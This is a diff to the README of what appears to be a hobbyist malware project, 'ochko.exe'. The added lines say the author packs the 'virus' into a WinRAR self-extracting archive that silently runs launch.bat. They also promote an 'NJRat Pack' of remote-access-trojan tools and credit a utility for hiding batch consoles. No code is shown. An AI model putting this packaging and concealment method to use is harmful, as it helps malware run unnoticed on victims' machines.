@@ -23,8 +23,11 @@ https://github.com/artzab1103/ochko.exe/assets/102410925/08c767b5-5c6f-483e-9274
 
 I fixed some things and make first release. And i wanna make full recode to release on GitHub :)
 
-# Building
-I using WinRAR (SFX Archive). It extrats virus and run launch.bat silently
+# How to build
+I using [WinRAR](https://win-rar.com) (SFX Archive). It extrats virus and run launch.bat silently
+
+# Also see
+[NJRat Pack](https://github.com/artzab1103/njrat-pack): A collab pack with some russian ratters 
 
 # Credits
 [BatToExe](https://github.com/Makazzz/BatToExePortable): hiding .bat consoles
